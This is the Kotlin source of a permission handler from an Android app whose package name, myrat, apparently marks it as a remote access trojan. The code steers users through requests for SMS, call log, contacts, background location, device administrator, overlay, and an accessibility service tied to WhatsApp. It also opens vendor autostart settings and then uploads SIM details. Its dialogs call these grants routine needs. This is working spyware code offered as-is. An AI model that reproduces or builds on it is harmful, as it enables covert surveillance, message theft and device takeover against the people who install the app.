package com.myrat.app.handler

import android.Manifest
import android.app.Activity
import android.app.AppOpsManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import com.guolindev.permissionx.PermissionX
import com.myrat.app.utils.Logger
import java.lang.ref.WeakReference

class PermissionHandler(
    activity: Activity,
    private val simDetailsHandler: SimDetailsHandler
) {
    private val activityRef = WeakReference(activity)
    private var currentStep = 0
    private val totalSteps = 6
    
    // Only permissions that actually require runtime requests according to PermissionX docs
    private val runtimePermissions = mutableListOf<String>().apply {
        // Core SMS and Phone permissions
        add(Manifest.permission.RECEIVE_SMS)
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.SEND_SMS)
        add(Manifest.permission.READ_PHONE_STATE)
        add(Manifest.permission.CALL_PHONE)
        
        // Location permissions
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        
        // Contact and Call log permissions
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.READ_CALL_LOG)
        
        // Storage permissions (conditional)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        
        // Phone number permission (conditional)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        
        // Background location (separate request as per PermissionX docs)
        // Will be requested separately after foreground location
    }

    fun requestPermissions() {
        val activity = activityRef.get() ?: return
        
        Logger.log("Starting PermissionX permission flow")
        currentStep = 1
        
        // Step 1: Request core runtime permissions first
        requestCorePermissions(activity)
    }

    private fun requestCorePermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting core runtime permissions")
        
        PermissionX.init(activity)
            .permissions(runtimePermissions)
            .onExplainRequestReason { scope, deniedList ->
                val message = buildExplanationMessage(deniedList)
                scope.showRequestReasonDialog(deniedList, message, "Grant", "Deny")
            }
            .onForwardToSettings { scope, deniedList ->
                val message = buildSettingsMessage(deniedList)
                scope.showForwardToSettingsDialog(deniedList, message, "Settings", "Cancel")
            }
            .request { allGranted, grantedList, deniedList ->
                Logger.log("Core permissions result - All granted: $allGranted")
                Logger.log("Granted: ${grantedList.size}, Denied: ${deniedList.size}")
                
                if (deniedList.isNotEmpty()) {
                    Logger.warn("Some core permissions denied: $deniedList")
                }
                
                // Continue to background location if foreground location was granted
                currentStep++
                if (grantedList.contains(Manifest.permission.ACCESS_FINE_LOCATION) || 
                    grantedList.contains(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    requestBackgroundLocation(activity)
                } else {
                    requestSpecialPermissions(activity)
                }
            }
    }

    private fun requestBackgroundLocation(activity: Activity) {
        // Background location requires separate request as per PermissionX docs
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            Logger.log("Step $currentStep/$totalSteps: Requesting background location")
            
            PermissionX.init(activity)
                .permissions(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                .onExplainRequestReason { scope, deniedList ->
                    scope.showRequestReasonDialog(
                        deniedList,
                        "Background location access is needed to track location when the app is not actively being used. This enables location monitoring even when the screen is off.",
                        "Grant",
                        "Deny"
                    )
                }
                .onForwardToSettings { scope, deniedList ->
                    scope.showForwardToSettingsDialog(
                        deniedList,
                        "Background location was denied. Please go to Settings > App Permissions > Location and select 'Allow all the time'.",
                        "Settings",
                        "Cancel"
                    )
                }
                .request { allGranted, grantedList, deniedList ->
                    Logger.log("Background location result - Granted: $allGranted")
                    currentStep++
                    requestSpecialPermissions(activity)
                }
        } else {
            currentStep++
            requestSpecialPermissions(activity)
        }
    }

    private fun requestSpecialPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Checking special permissions")
        
        // These are NOT runtime permissions and should be handled via Settings intents
        val specialPermissions = mutableListOf<String>()
        
        // Battery optimization
        if (!isBatteryOptimizationDisabled(activity)) {
            specialPermissions.add("Battery Optimization")
        }
        
        // System alert window
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
            specialPermissions.add("Display over other apps")
        }
        
        // Device admin
        if (!isDeviceAdminEnabled(activity)) {
            specialPermissions.add("Device Administrator")
        }
        
        // Accessibility service
        if (!isAccessibilityServiceEnabled(activity)) {
            specialPermissions.add("Accessibility Service")
        }
        
        // Exact alarms (Android 12+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            if (!alarmManager.canScheduleExactAlarms()) {
                specialPermissions.add("Schedule Exact Alarms")
            }
        }
        
        if (specialPermissions.isNotEmpty()) {
            Logger.log("Special permissions needed: $specialPermissions")
            requestBatteryOptimization(activity)
        } else {
            Logger.log("All special permissions already granted")
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    private fun requestBatteryOptimization(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting battery optimization disable")
        
        if (isBatteryOptimizationDisabled(activity)) {
            currentStep++
            requestOverlayPermission(activity)
            return
        }
        
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Battery optimization intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestOverlayPermission(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request battery optimization", e)
            currentStep++
            requestOverlayPermission(activity)
        }
    }

    private fun requestOverlayPermission(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting overlay permission")
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(activity)) {
            currentStep++
            requestDeviceAdmin(activity)
            return
        }
        
        try {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Overlay permission intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestDeviceAdmin(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request overlay permission", e)
            currentStep++
            requestDeviceAdmin(activity)
        }
    }

    private fun requestDeviceAdmin(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting device admin")
        
        if (isDeviceAdminEnabled(activity)) {
            currentStep++
            requestAccessibilityService(activity)
            return
        }
        
        try {
            val adminComponent = ComponentName(activity, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "This permission allows the app to lock the device and manage security settings.")
            }
            activity.startActivity(intent)
            Logger.log("Device admin intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestAccessibilityService(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request device admin", e)
            currentStep++
            requestAccessibilityService(activity)
        }
    }

    private fun requestAccessibilityService(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting accessibility service")
        
        if (isAccessibilityServiceEnabled(activity)) {
            currentStep++
            requestExactAlarms(activity)
            return
        }
        
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            activity.startActivity(intent)
            Logger.log("Accessibility settings intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestExactAlarms(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to open accessibility settings", e)
            currentStep++
            requestExactAlarms(activity)
        }
    }

    private fun requestExactAlarms(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting exact alarms permission")
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            currentStep++
            requestManufacturerSpecificSettings(activity)
            return
        }
        
        val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        if (alarmManager.canScheduleExactAlarms()) {
            currentStep++
            requestManufacturerSpecificSettings(activity)
            return
        }
        
        try {
            val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Exact alarms permission intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request exact alarms permission", e)
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    private fun requestManufacturerSpecificSettings(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Opening manufacturer-specific settings")
        
        val manufacturer = Build.MANUFACTURER.lowercase()
        Logger.log("Device manufacturer: $manufacturer")
        
        try {
            when {
                manufacturer.contains("xiaomi") -> openXiaomiSettings(activity)
                manufacturer.contains("oppo") -> openOppoSettings(activity)
                manufacturer.contains("vivo") -> openVivoSettings(activity)
                manufacturer.contains("huawei") -> openHuaweiSettings(activity)
                manufacturer.contains("samsung") -> openSamsungSettings(activity)
                manufacturer.contains("oneplus") -> openOnePlusSettings(activity)
                manufacturer.contains("realme") -> openRealmeSettings(activity)
                else -> {
                    Logger.log("No specific manufacturer settings for: $manufacturer")
                    finishPermissionFlow(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Failed to open manufacturer settings", e)
            finishPermissionFlow(activity)
        }
    }

    private fun openXiaomiSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            Intent().setComponent(ComponentName("com.xiaomi.mipicks", "com.xiaomi.mipicks.ui.AppPicksTabActivity")),
            Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName)
        )
        
        tryLaunchIntents(activity, intents, "MIUI Security settings")
    }

    private fun openOppoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity"))
        )
        
        tryLaunchIntents(activity, intents, "ColorOS Phone Manager")
    }

    private fun openVivoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.PurviewTabActivity"))
        )
        
        tryLaunchIntents(activity, intents, "Vivo iManager")
    }

    private fun openHuaweiSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"))
        )
        
        tryLaunchIntents(activity, intents, "Huawei Phone Manager")
    }

    private fun openSamsungSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            Intent().setComponent(ComponentName("com.samsung.android.sm_cn", "com.samsung.android.sm.ui.ram.AutoRunActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        
        tryLaunchIntents(activity, intents, "Samsung Device Care")
    }

    private fun openOnePlusSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")),
            Intent().setComponent(ComponentName("com.android.settings", "com.android.settings.Settings\$HighPowerApplicationsActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        
        tryLaunchIntents(activity, intents, "OnePlus Security")
    }

    private fun openRealmeSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent().setComponent(ComponentName("com.realme.rmm", "com.realme.rmm.ui.StartupAppListActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        
        tryLaunchIntents(activity, intents, "Realme Phone Manager")
    }

    private fun tryLaunchIntents(activity: Activity, intents: List<Intent>, settingsName: String) {
        for (intent in intents) {
            try {
                if (intent.resolveActivity(activity.packageManager) != null) {
                    activity.startActivity(intent)
                    Logger.log("Successfully opened $settingsName")
                    
                    // Finish after delay
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        finishPermissionFlow(activity)
                    }, 2000)
                    return
                }
            } catch (e: Exception) {
                Logger.warn("Failed to launch intent for $settingsName: ${e.message}")
            }
        }
        
        // Fallback to app settings
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Opened app settings as fallback for $settingsName")
        } catch (e: Exception) {
            Logger.error("Failed to open app settings fallback", e)
        }
        
        finishPermissionFlow(activity)
    }

    private fun finishPermissionFlow(activity: Activity) {
        Logger.log("Permission flow completed")
        
        // Upload SIM details after permissions are granted
        try {
            simDetailsHandler.uploadSimDetails()
        } catch (e: Exception) {
            Logger.error("Failed to upload SIM details", e)
        }
    }

    private fun buildExplanationMessage(deniedList: List<String>): String {
        val permissionReasons = mapOf(
            Manifest.permission.RECEIVE_SMS to "receive and monitor SMS messages",
            Manifest.permission.READ_SMS to "read existing SMS messages",
            Manifest.permission.SEND_SMS to "send SMS messages",
            Manifest.permission.READ_PHONE_STATE to "access phone information and SIM details",
            Manifest.permission.READ_PHONE_NUMBERS to "read phone numbers from SIM cards",
            Manifest.permission.CALL_PHONE to "make phone calls",
            Manifest.permission.ACCESS_FINE_LOCATION to "access precise location for tracking",
            Manifest.permission.ACCESS_COARSE_LOCATION to "access approximate location",
            Manifest.permission.ACCESS_BACKGROUND_LOCATION to "access location in background",
            Manifest.permission.READ_CONTACTS to "read contact information",
            Manifest.permission.READ_CALL_LOG to "read call history",
            Manifest.permission.READ_EXTERNAL_STORAGE to "read files and images",
            Manifest.permission.READ_MEDIA_IMAGES to "read images from device storage",
            Manifest.permission.POST_NOTIFICATIONS to "show notifications"
        )
        
        val reasons = deniedList.mapNotNull { permission ->
            permissionReasons[permission]?.let { reason ->
                "• ${permission.substringAfterLast(".")} - $reason"
            }
        }
        
        return "This app needs the following permissions to function properly:\n\n${reasons.joinToString("\n")}\n\nPlease grant these permissions to continue."
    }

    private fun buildSettingsMessage(deniedList: List<String>): String {
        return "Some permissions were permanently denied. Please go to Settings and manually grant the following permissions:\n\n${deniedList.joinToString("\n") { "• ${it.substringAfterLast(".")}" }}"
    }

    // Helper methods for checking permission states
    private fun isBatteryOptimizationDisabled(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            powerManager.isIgnoringBatteryOptimizations(context.packageName)
        } else {
            true
        }
    }

    private fun isDeviceAdminEnabled(context: Context): Boolean {
        return try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            devicePolicyManager.isAdminActive(adminComponent)
        } catch (e: Exception) {
            false
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val services = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                services?.contains("${context.packageName}/com.myrat.app.service.WhatsAppService") == true
            } else {
                false
            }
        } catch (e: Exception) {
            false
        }
    }

    fun areAllPermissionsGranted(): Boolean {
        val activity = activityRef.get() ?: return false
        
        // Check runtime permissions using PermissionX
        val runtimeGranted = PermissionX.isGranted(activity, *runtimePermissions.toTypedArray())
        
        // Check background location separately
        val backgroundLocationGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            PermissionX.isGranted(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        } else {
            true
        }
        
        // Check special permissions
        val batteryOptimized = isBatteryOptimizationDisabled(activity)
        val overlayGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(activity)
        } else {
            true
        }
        val deviceAdminGranted = isDeviceAdminEnabled(activity)
        val accessibilityGranted = isAccessibilityServiceEnabled(activity)
        
        val exactAlarmsGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            alarmManager.canScheduleExactAlarms()
        } else {
            true
        }
        
        Logger.log("Permission status - Runtime: $runtimeGranted, Background: $backgroundLocationGranted, Battery: $batteryOptimized, Overlay: $overlayGranted, DeviceAdmin: $deviceAdminGranted, Accessibility: $accessibilityGranted, ExactAlarms: $exactAlarmsGranted")
        
        return runtimeGranted && backgroundLocationGranted && batteryOptimized && overlayGranted && deviceAdminGranted && accessibilityGranted && exactAlarmsGranted
    }

    fun handleResume() {
        // Check if all permissions are granted when activity resumes
        val activity = activityRef.get() ?: return
        
        if (areAllPermissionsGranted()) {
            Logger.log("All permissions granted on resume")
            finishPermissionFlow(activity)
        }
    }

    fun cleanup() {
        // Clean up any resources
        Logger.log("PermissionHandler cleanup completed")
    }
}